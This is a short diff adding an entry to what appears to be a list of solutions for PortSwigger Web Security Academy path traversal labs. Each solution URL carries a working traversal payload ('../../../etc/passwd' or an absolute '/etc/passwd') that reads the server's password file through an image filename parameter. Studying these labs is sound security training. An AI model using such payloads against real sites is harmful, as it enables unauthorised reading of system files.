@@ -2,3 +2,7 @@
 url: https://portswigger.net/web-security/file-path-traversal/lab-simple
 solution: https://ac1f1f521ea7051780504322000d0090.web-security-academy.net/image?filename=../../../etc/passwd
 
+[lab: File path traversal, traversal sequences blocked with absolute path bypass]
+url: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
+solution: https://acf11f0b1e1ea11180f408d700e800a5.web-security-academy.net/image?filename=/etc/passwd
+
